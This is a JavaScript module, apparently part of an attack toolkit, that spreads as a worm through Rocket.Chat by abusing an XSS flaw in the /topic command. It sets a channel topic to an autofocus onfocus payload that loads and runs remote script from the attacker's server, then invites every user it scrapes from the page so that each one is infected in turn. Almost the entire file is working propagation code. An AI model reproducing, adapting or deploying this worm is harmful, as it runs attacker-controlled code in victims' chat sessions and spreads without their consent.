"use strict";

/*
 * This modules spreads using a XSS vulnerability in /topic,
 * which was patched in October of 2016.
 * 
 * This is a SUPER-hacky propagation module btw, so don't judge.
 * 
 */


define({

    propagate: function() {
        if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
            console.log('Starting RocketCat propagation module');
            this.infectChannel();
        }
    },

    infectChannel: function() {
        var users = this.listUsers();
        var payload = encodeURI('console.log(1);$.getScript(\'' + __ld_server + '/js/little-doctor.js\');');
       
        var _this = this;
        setTimeout(function() {
            
            // Set the topic to the XSS payload
            _this.setTopic('NOT-A-TRAP<input type="text" autofocus onfocus="' + payload + '">');
            setTimeout(function() {
                
                // Invite all users
                for (var index = 0; index < users.length; ++index) {
                    console.log('Sending invite to: ' + users[index]);
                    _this.sendInvite(users[index]);
                }

            }, 500);
        }, 500);
    },

    listUsers: function() {
        var userTags = document.querySelectorAll('[data-username]');
        var users = new Set();
        for (var index = 0; index < userTags.length; ++index) {
            users.add(userTags[index].getAttribute('data-username'));
        }
        console.log(users);
        return Array.from(users);
    },

    getChatWindowId: function() {
        var chatWindow = $('[id^=chat-window-')[0].id;
        var rid = chatWindow.split('chat-window-')[1];
        console.log('Chat Window ID is: ' + rid);
        return rid;
    },

    setTopic: function(topic) {
        console.log('Set topic to: ' + topic);
        RocketChat.slashCommands.run('topic', topic, {
            _id: "asdfasdfasdf",
            rid: this.getChatWindowId(),
            msg: "/topic " + topic
        });
    },

    sendInvite: function(user) {
        RocketChat.slashCommands.run('invite', user, {
            _id: "asdfasdfasdf2",
            rid: this.getChatWindowId(),
            msg: "/invite " + user
        });
    },

    sendMessage: function(message, delay) {
        console.log('Sending message: ' + message);
        var textarea = document.getElementsByClassName('input-message')[0];
        if (textarea) {
            setTimeout(function() {
                textarea.value = message;
                $('textarea').trigger('keyup');  // Yea fuck it we'll use jQuery
                setTimeout(function() {
                    var send = document.getElementsByClassName('send-button')[0];
                    if (send) {
                        send.click();
                    } else {
                        console.log('Error: Could not find send-message');
                    }
                }, 100);
            }, delay || 100);
        } else {
            console.log('Error: Could not find input-message');
        }

    }

});